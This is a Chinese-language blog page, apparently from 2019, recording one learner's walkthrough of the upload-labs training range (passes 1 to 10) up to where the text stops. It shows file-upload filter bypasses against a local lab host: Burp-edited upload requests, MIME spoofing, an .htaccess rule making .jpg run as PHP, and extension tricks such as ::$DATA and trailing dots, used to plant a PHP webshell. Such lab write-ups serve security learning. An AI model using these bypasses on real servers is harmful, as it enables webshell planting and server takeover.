@@ -1,0 +1,1692 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="google-site-verification" content="jIIp89W5czDndIpDpqacsdM_ooroPfoz-v_D4UrrwmM" />
+
+<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+<style>
+    .pace .pace-progress {
+        background: #a40000; /*进度条颜色*/
+        height: 3px;
+    }
+    .pace .pace-progress-inner {
+         box-shadow: 0 0 10px #1E92FB, 0 0 5px     #a40000; /*阴影颜色*/
+    }
+    .pace .pace-activity {
+        border-top-color: #a40000;    /*上边框颜色*/
+        border-left-color: #a40000;    /*左边框颜色*/
+    }
+</style>
+
+
+
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon32.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon16.png?v=5.1.4">
+
+
+
+
+
+
+  <meta name="keywords" content="文件上传," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="本文记录了练习upload labs 的过程,已经学习完了,有很多问题没有解决,有一些pass也看得很走马观花,但是时间不多先学习其他的.末尾也会持续补充关于upload的知识积累">
+<meta name="keywords" content="文件上传">
+<meta property="og:type" content="article">
+<meta property="og:title" content="upload labs 练习">
+<meta property="og:url" content="https://e1sewhere.github.io/2019/02/13/upload-labs-练习/index.html">
+<meta property="og:site_name" content="E1sewhere">
+<meta property="og:description" content="本文记录了练习upload labs 的过程,已经学习完了,有很多问题没有解决,有一些pass也看得很走马观花,但是时间不多先学习其他的.末尾也会持续补充关于upload的知识积累">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://e1sewhere.github.io/images/upload类型.png">
+<meta property="og:image" content="https://e1sewhere.github.io/images/判断upload.png">
+<meta property="og:image" content="https://e1sewhere.github.io/images/tjjz.png">
+<meta property="og:image" content="https://e1sewhere.github.io/images/jjpl.png">
+<meta property="og:image" content="https://e1sewhere.github.io/images/522.png">
+<meta property="og:image" content="https://e1sewhere.github.io/images/553.png">
+<meta property="og:updated_time" content="2019-04-07T08:29:05.880Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="upload labs 练习">
+<meta name="twitter:description" content="本文记录了练习upload labs 的过程,已经学习完了,有很多问题没有解决,有一些pass也看得很走马观花,但是时间不多先学习其他的.末尾也会持续补充关于upload的知识积累">
+<meta name="twitter:image" content="https://e1sewhere.github.io/images/upload类型.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://e1sewhere.github.io/2019/02/13/upload-labs-练习/"/>
+
+
+
+
+
+  <title>upload labs 练习 | E1sewhere</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+
+  <div class="container  page-post-detail">
+   
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+    
+    <div class="top-scroll-bar"></div>
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">E1sewhere</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header> 
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://e1sewhere.github.io/2019/02/13/upload-labs-练习/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="E1se">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/eva1.ico">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="E1sewhere">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">upload labs 练习</h1>
+        
+
+        <div class="post-meta">
+		
+
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-02-13T08:27:43+08:00">
+                2019-02-13
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2019-04-07T16:29:05+08:00">
+                2019-04-07
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/笔记/" itemprop="url" rel="index">
+                    <span itemprop="name">笔记</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/02/13/upload-labs-练习/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2019/02/13/upload-labs-练习/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2019/02/13/upload-labs-练习/" class="leancloud_visitors" data-flag-title="upload labs 练习">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">热度&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+				 <span>℃</span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  7,685
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  30
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+    
+    
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <script src="\assets\js\APlayer.min.js"> </script><p>本文记录了练习upload labs 的过程,已经学习完了,有很多问题没有解决,有一些pass也看得很走马观花,但是时间不多先学习其他的.<br>末尾也会持续补充关于upload的知识积累<br><a id="more"></a></p>
+<h1 id="没有解决的pass"><a href="#没有解决的pass" class="headerlink" title="没有解决的pass"></a>没有解决的pass</h1><ul>
+<li><del><a href="#pass3">pass3</a> 还有burp截包没有返回的问题.</del> //刚才测试昨天试过的抓包步骤都是可以抓到的.操作没有问题.</li>
+<li><del><a href="#less5">pass5</a> 同pass3</del> //同上,解决</li>
+<li><a href="#less11">pass11</a> url截断上传失败</li>
+<li><a href="#pass12">pass12</a> hex截断上传失败</li>
+</ul>
+<h1 id="upload漏洞粗略了解"><a href="#upload漏洞粗略了解" class="headerlink" title="upload漏洞粗略了解"></a>upload漏洞粗略了解</h1><h2 id="upload类型"><a href="#upload类型" class="headerlink" title="upload类型"></a>upload类型</h2><p><img src="https://e1sewhere.github.io/images/upload类型.png" alt="upload类型.png"></p>
+<h2 id="判断upload"><a href="#判断upload" class="headerlink" title="判断upload"></a>判断upload</h2><p><img src="https://e1sewhere.github.io/images/判断upload.png" alt="判断upload.png"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><strong>判断操作系统</strong></p>
+<blockquote>
+<p>我们使用构造后缀的方法时,与操作系统息息相关,例如添加空格,添加点,添加<code>::$DATA</code>都是windows系统的特性,要多注意服务器的版本,与服务所在的操作系统.</p>
+</blockquote>
+<h1 id="参考过的比较好的writup"><a href="#参考过的比较好的writup" class="headerlink" title="参考过的比较好的writup"></a>参考过的比较好的writup</h1><ol>
+<li><a href="https://github.com/LandGrey/upload-labs-writeup" target="_blank" rel="noopener">https://github.com/LandGrey/upload-labs-writeup</a></li>
+<li><a href="https://zhuanlan.zhihu.com/p/52099683" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/52099683</a></li>
+<li><a href="https://fuping.site/2018/06/04/upload-labs-writeup/" target="_blank" rel="noopener">https://fuping.site/2018/06/04/upload-labs-writeup/</a></li>
+</ol>
+<p>没有看很多,主要看他们的思路.</p>
+<h1 id="WritUp"><a href="#WritUp" class="headerlink" title="WritUp"></a>WritUp</h1><h2 id="pass-01-客户端后缀检查"><a href="#pass-01-客户端后缀检查" class="headerlink" title="pass 01 客户端后缀检查"></a>pass 01 客户端后缀检查</h2><p>上传jpg文件成功,上传php文件失败,提示后缀问题.白名单检测.由于弹出错误很快,我们猜测是客户端校验<br>直接单击了’查看提示’,知道了这个pass是本地js检查文件,可以本地修改.</p>
+<h3 id="方法一-firefox-开发者工具直接修改-待查"><a href="#方法一-firefox-开发者工具直接修改-待查" class="headerlink" title="方法一 firefox 开发者工具直接修改 待查?"></a>方法一 firefox 开发者工具直接修改 待查?</h3><p>f12-&gt;查看器<br>找到响应js部分(直接搜索jpg)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var allow_ext = &quot;.jpg|.png|.gif&quot;;</span><br></pre></td></tr></table></figure>
+<p>直接添加,一个<code>|.php</code>.<br>理论上就可以上传了.但是上传失败,提示依旧</p>
+<h3 id="方法二-禁用js"><a href="#方法二-禁用js" class="headerlink" title="方法二 禁用js"></a>方法二 禁用js</h3><p>直接禁用浏览器js功能,安装firefox插件<code>noscript</code>,禁用浏览器js.重试上传过程,成功</p>
+<h3 id="方法三-burp改包"><a href="#方法三-burp改包" class="headerlink" title="方法三 burp改包"></a>方法三 burp改包</h3><p>把一句话木马后缀改为<code>.jpg</code><br>burp代理好,点击上传.把劫到的包发送到,burp的repeater.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /upload-labs/Pass-01/index.php HTTP/1.1</span><br><span class="line">Host: 192.168.96.128</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: http://192.168.96.128/upload-labs/Pass-01/index.php</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------7020711924050</span><br><span class="line">Content-Length: 297</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">-----------------------------7020711924050</span><br><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;m.jpg&quot;  //这里修改为`m.php`</span><br><span class="line">Content-Type: image/jpeg</span><br></pre></td></tr></table></figure>
+<p>查看头,把<code>filename</code>改为<code>php</code>后缀.点击go,右边查看返回页面源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;../upload/m.php&quot; width=&quot;250px&quot; /&gt;</span><br></pre></td></tr></table></figure>
+<p>在一个<code>img</code>标签中找到我们上传的文件路径,看到文件已经变为<code>php</code>文件.</p>
+<h2 id="pass2-服务端mime检查"><a href="#pass2-服务端mime检查" class="headerlink" title="pass2 服务端mime检查"></a>pass2 服务端mime检查</h2><p>本pass在服务端对数据包的MIME进行检查.</p>
+<p>直接像pass1一样使用burpsuit修改.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;2.php&quot; //这里直接上传php文件即可不要修改</span><br><span class="line">Content-Type: image/png  //这里原来不是img类型,我们修改为img类型</span><br></pre></td></tr></table></figure>
+<p>修改后,go,查看成功了</p>
+<h2 id="pass3-服务端黑名单"><a href="#pass3-服务端黑名单" class="headerlink" title="pass3 服务端黑名单 ???"></a>pass3 服务端黑名单 <span id="pass3">???</span></h2><p>上传提示不允许php等文件上传,查看提示,应该是服务端黑名单<br><del>本例按照网上的writup无法复现,暂时搁置</del>   //已经问题随着pass2的解决同时解决了,参考pass2<br>//关于,使用burp抓包后,抓不到我们请求的包抓,burp代理firefox,firefox会向服务器发送包,所以浏览器请求的时候发了两个包,一个是像火狐服务器,一个是向网站.我们需要在burp的proxy选项卡的子选项卡intercept,里面.点,<code>drop</code>丢弃这个火狐的包,或者<code>fordard</code>放行这个包,当然点<code>drop</code>最好</p>
+<h3 id="方法一-直接绕过"><a href="#方法一-直接绕过" class="headerlink" title="方法一 直接绕过"></a>方法一 直接绕过</h3><p>文件直接修改<br>我们修改php后缀,服务器只禁止了<code>.php</code>也许没有禁止<code>phtml,php3</code>等可以解析的php后缀.<br>修改为<code>php3</code>上传成功.尝试使用菜刀连接连接失败.<br>直接看服务器的上传路径原来是文件被重命名了.<br>查看网页上提供的源码提示有如下代码,限制大小写,去末尾点,去末尾<code>::data</code>,去末尾空.这三种构造后缀绕过.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">      $file_ext = strrchr($file_name, &apos;.&apos;);</span><br><span class="line">      $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">      $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA</span><br><span class="line">      $file_ext = trim($file_ext); //收尾去空</span><br></pre></td></tr></table></figure>
+<p>本方法失败,我们尝试用新的名称菜刀连接,成功了.<br><del>但是现实我们很难获得改变后的名称.</del><br>哈哈,昨天傻了,还’很难获得’,直接使用burp抓包看返回的图片路径,就知道的我们长传的文件的路径和名称,或者直接用浏览器看源码也可以知道,昨天忘记了的原因可能是burp不知道为什么一直抓不到包.刚才测试昨天试过的抓包步骤都是可以抓到的.操作没有问题</p>
+<h3 id="方法二-htaccess文件上传解析漏洞-（重写解析规则绕过）"><a href="#方法二-htaccess文件上传解析漏洞-（重写解析规则绕过）" class="headerlink" title="方法二 htaccess文件上传解析漏洞 （重写解析规则绕过）"></a>方法二 htaccess文件上传解析漏洞 （重写解析规则绕过）</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>.htaccess是apache服务器中的一个配置文件,不是上传的文件的黑名单之内 ,所以.htaccess文件是可以上传成功<br>上传覆盖.htaccess文件，重写解析规则，将上传的带有脚本马的图片以脚本方式解析</p>
+<h4 id="上传"><a href="#上传" class="headerlink" title="上传"></a>上传</h4><p>打开记事本，将如下代码写入文本中：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType  application/x-httpd-php    .jpg</span><br></pre></td></tr></table></figure>
+<p>然后点击文件选中另存为，编写文件名为<code>.htaccess</code>(win创建点开头的文件可以用命令行,或者重命名的时候在后面多加一个点如<code>.htaccess.</code>否则会报错)，选择保存类型为所有文件<br><code>.htaccess</code>文件里的代码的含义 是 将上传的文件后缀名为<code>.jpg</code>格式的文件以<code>php</code>格式来解析文件。<br>将<code>.htaccess</code>文件进行上传,上传成功。<br>按照原理这里我们直接上传<code>.jpg</code>后缀的一句话就可以了.但是我们直接查看上传路径,我们的规则文件也被重命名了.所以本例子中无法成功.</p>
+<p><em>为了测试新学会的这个法二,我们手动修改好两个文件,试一试能否连接</em></p>
+<p>直接往上传文件夹复制两个文件<code>2.jpg</code> <code>.htaccess</code><br>使用菜刀连接,连接成功了<code>2.jpg</code>如我们期望被服务器作为php文件解析了.</p>
+<h2 id="pass4-服务端黑名单检查"><a href="#pass4-服务端黑名单检查" class="headerlink" title="pass4 服务端黑名单检查"></a>pass4 服务端黑名单检查</h2><p>页面直接重新加载,猜测是服务端验证.<br>我们修改后缀为<code>.php3</code>依然报错<br>查看提示,这是黑名单过滤,过滤了绝大部分可执行文件后缀.</p>
+<h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>直接在<code>.php</code>后再添加一个服务器无法解析的后缀,当无法解析的时候服务器会尝试解析前一个后缀.<br>我们将文件名称改为<code>4.php.7z</code>,上传成功了.<br>直接使用菜刀连接.成功了,文件被当作<code>php</code>文件解析了.</p>
+<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>继续使用上一个题目学会的上传解析规则文件的方法.<br>我们创建文本文档写入以下内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType  application/x-httpd-php    .jpg</span><br></pre></td></tr></table></figure>
+<p>然后将文件改名为<code>.htaccess</code>并上传<br>上传成功了<br>然后上传一个<code>4.jpg</code>的一句话,成功<br>使用菜刀连接,成功,文件被服务器当作php执行了.<br><span id="less5"></span></p>
+<h2 id="pass5"><a href="#pass5" class="headerlink" title="pass5"></a>pass5</h2><p>依然判断是服务器检查<br>我们先上传<code>.php3,.phptml</code>都是失败了.<br>再上传<code>.php.7z</code>成功了 由于上面的都可以通过添加后缀的方法绕过,猜测是我的靶场环境有点问题.后面的pass将会禁止这个方法.<br>我们直接查看提示,发现禁用了常见的后缀,<code>.htaccess</code>也被禁止了.<br>直接查看源代码<br>发现包含部分大小写,<code>php2</code>这样类似的方法都被禁止了<br>但是并没有完全禁止大小写.我们尝试一个没有被禁用的大小写.成功了,且被解析为<code>php</code><br>我们要用一个新学会的方法.</p>
+<h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><p>我们再次查看源码,过滤了末尾的<code>.</code>末尾的空格和末尾的<code>::%DATA</code><br>这三种字加到文件后缀的末尾都会被windows系统自动删除.而服务器处理的时候是会保留的并将其一通视为后缀.最后保存到本地windows中就被删除了.<br>一下是网上搜到的</p>
+<blockquote>
+<p>php+win时.<code>文件名+::$DATA</code>会把data之后的当文件流处理,最后保存的时候只保留<code>::$DATA</code>之前的文件名</p>
+</blockquote>
+<p>查看源码消除<code>::DATA</code>的方法,是直接删除,所以可以使用双写的方法绕过<br>我们将后缀构造成这样的形式<code>.php::%::%DATADATA</code><br>在通過服務器的時候会被服务器把中间的<code>::%DATA</code>删除,然后保存到windows中就是<code>.php::%DATA</code>这样的形式,由于windows的特性<code>::%DATA</code>会被删除(还是忽略?)最后保存到文件系统中就是我们想要的<code>.php</code>.<br>尝试菜刀连接成功了.<br>注意这里我们上传的文件除后缀部分依然被重命名了.需要查看burp的返回页面找到文件路径的名称.</p>
+<h2 id="pass6"><a href="#pass6" class="headerlink" title="pass6"></a>pass6</h2><h3 id="加空绕过"><a href="#加空绕过" class="headerlink" title="加空绕过"></a>加空绕过</h3><p>为了节约时间直接查看源码,过滤方法中将后缀全部替换为小写,删除末尾的点,去除末尾<code>::$DATA</code>.没有对末尾空格处理.<br>我们注意到这里依然将<code>::$DATA</code>直接去除,所以依然可以使用双写绕过.<br>这里我们不再重复,使用加空格绕过<br>构造这样的后缀<code>.php</code><br>上传成功.<br>查看burp返回页面</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;../upload/201902151027474533.php &quot; width=&quot;250px&quot; /&gt;</span><br></pre></td></tr></table></figure>
+<p>使用菜刀访问我们的文件,成功</p>
+<h2 id="pass7-后缀加点绕过"><a href="#pass7-后缀加点绕过" class="headerlink" title="pass7 后缀加点绕过"></a>pass7 后缀加点绕过</h2><p>节约时间,直接查看源码.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);</span><br><span class="line">$file_ext = strrchr($file_name, &apos;.&apos;);</span><br><span class="line">$file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">$file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA</span><br><span class="line">$file_ext = trim($file_ext); //首尾去空</span><br></pre></td></tr></table></figure>
+<p>可以看到没有对末尾的点处理,而且依然可以使用<code>::%DATA</code>双写<br>我们使用点号的漏洞,构造这样的后缀<code>.php.</code><br>查看burp的返回页面</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;../upload/5.php.&quot; width=&quot;250px&quot; /&gt;            &lt;/div&gt;</span><br></pre></td></tr></table></figure>
+<p>成功了,哈哈最神奇的是这次居然没有重命名了<br>我们用菜刀连接成功了.</p>
+<h2 id="pass8-DATA绕过"><a href="#pass8-DATA绕过" class="headerlink" title="pass8 ::$DATA绕过"></a>pass8 <code>::$DATA</code>绕过</h2><p>直接查看源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);</span><br><span class="line">       $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">       $file_ext = strrchr($file_name, &apos;.&apos;);</span><br><span class="line">       $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">       $file_ext = trim($file_ext); //首尾去空</span><br></pre></td></tr></table></figure>
+<p>没有过滤<code>::$DATA</code>这次连双写都不用了,直接添加这个尾缀.<br>这里就不再操作</p>
+<h2 id="pass9"><a href="#pass9" class="headerlink" title="pass9"></a>pass9</h2><p>直接看源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);</span><br><span class="line">$file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">$file_ext = strrchr($file_name, &apos;.&apos;);</span><br><span class="line">$file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">$file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA</span><br><span class="line">$file_ext = trim($file_ext); //首尾去空</span><br></pre></td></tr></table></figure>
+<p>这次6,7,8pass用的方法都不能用了.<br>我们试一下最开始使用过的方法利用php解析漏洞构造这样的尾缀<code>.php.7z</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;../upload/5.php.7z&quot; width=&quot;250px&quot; /&gt;</span><br></pre></td></tr></table></figure>
+<p>成功了</p>
+<p>但是我需要用其他的方法,于是搜索writup<br>有这样一种方法</p>
+<p>我们查看方法调用,先去除了末尾的点,有去除了末尾的空.<br>那么构造一个这样的后缀试一下<code>.php. .</code><br>按照我们的想法,服务处理后就变成了<code>.php.</code><br>这就是我们想要的后缀.<br>使用burp返回页面</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;../upload/9.php. &quot; width=&quot;250px&quot; /&gt;            &lt;/div&gt;</span><br></pre></td></tr></table></figure>
+<p>成功了.</p>
+<h2 id="pass10"><a href="#pass10" class="headerlink" title="pass10"></a>pass10</h2><p>直接查看源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);</span><br><span class="line">$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</span><br><span class="line">$temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];</span><br></pre></td></tr></table></figure>
+<p>第二个方法把<code>$deny_ext</code>这个数组里包含的所有后缀都替换为空,我们先试一下<code>.phP</code><br>上传成功了但是查看返回</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;../upload/5.&quot; width=&quot;250px&quot; /&gt;</span><br></pre></td></tr></table></figure>
+<p><code>phP</code>被替换了,这个替换是忽略大小写的.</p>
+<p>但由于是直接替换为空,我们就可以使用双写了.</p>
